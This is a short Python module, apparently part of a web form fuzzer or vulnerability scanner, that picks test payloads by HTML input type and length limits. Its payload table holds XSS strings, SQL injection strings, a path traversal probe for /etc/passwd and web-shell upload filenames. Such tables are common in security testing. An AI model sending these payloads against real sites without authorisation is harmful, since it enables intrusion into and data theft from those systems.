from typing import Dict, List, Any

# Payload tanımları
_TYPE_PAYLOADS: Dict[str, List[str]] = {
    "text": ["<script>alert(1)</script>", "' OR '1'='1"],
    "search": ["test", "../../../../etc/passwd"],
    "email": ["injection@test.com", "\"onmouseover=alert(1)\"@x.com"],
    "password": ["Password123!", "' OR ''='"],
    "number": ["0", "-1", "999999999", "1 OR 1=1"],
    "range": ["0", "100"],
    "tel": ["+900000000000", "<svg/onload=alert(1)>", "' OR 1=1--"],
    "url": ["http://evil.com", "javascript:alert(1)"],
    "checkbox": ["on", "off", "true", "false"],
    "radio": ["on", "off", "1", "0"],
    "hidden": ["admin", "' OR 1=1--"],
    "file": ["shell.php", "evil.jpg.php"],
    "date": ["2025-01-01", "9999-12-31", "' OR 1=1--"],
    "datetime-local": ["2025-06-24T12:34", "2025-12-31T23:59"],
    "color": ["#000000", "#ffffff"],
    "month": ["2025-01", "2025-12"],
    "week": ["2025-W01", "2025-W52"],
    "time": ["12:00", "23:59"],
    "submit": ["Submit"],
    "reset": ["Reset"],
    "button": ["Click"],
    "image": ["/path/to/image.jpg"],
}

_FALLBACKS = {
    "numeric": ["0", "-1", "9999"],
    "boolean": ["true", "false"],
    "string": ["test", "<svg/onload=alert(1)>"],
    "date": ["2025-01-01"]
}

def _category(t: str) -> str:
    if t in ("number", "range"):
        return "numeric"
    if t in ("checkbox", "radio"):
        return "boolean"
    if t in ("date", "time", "month", "week", "datetime-local"):
        return "date"
    return "string"

def _respect_attrs(payloads: List[str], attrs: Dict[str, Any]) -> List[str]:
    if not attrs:
        return payloads
    maxlength = int(attrs.get("maxlength", 0)) or None
    minlength = int(attrs.get("minlength", 0)) or None
    filtered: List[str] = []
    for p in payloads:
        if maxlength and len(p) > maxlength:
            continue
        if minlength and len(p) < minlength:
            continue
        filtered.append(p)
    return filtered or payloads

def analyze_input(input_type: str, input_name: str = "", attrs: Dict[str, Any] | None = None) -> Dict[str, Any]:
    t = (input_type or "text").lower()
    payloads = _TYPE_PAYLOADS.get(t, []).copy()
    if not payloads:
        payloads = _FALLBACKS[_category(t)].copy()
    payloads = _respect_attrs(payloads, attrs or {})
    return {
        "input_name": input_name,
        "input_type": t,
        "attrs": attrs or {},
        "payloads": payloads,
    }

# Örnek test senaryoları
if __name__ == "__main__":
    test_inputs = [
        {"type": "text", "name": "username", "attrs": {"maxlength": "10"}},
        {"type": "number", "name": "age", "attrs": {"min": "1", "max": "100"}},
        {"type": "password", "name": "pwd", "attrs": {}},
        {"type": "checkbox", "name": "accept", "attrs": {"required": ""}},
        {"type": "date", "name": "birth", "attrs": {}},
    ]

    for ti in test_inputs:
        result = analyze_input(ti["type"], ti["name"], ti["attrs"])
        print(f"\nInput: {ti['name']}")
        print("Payloads:", result["payloads"])
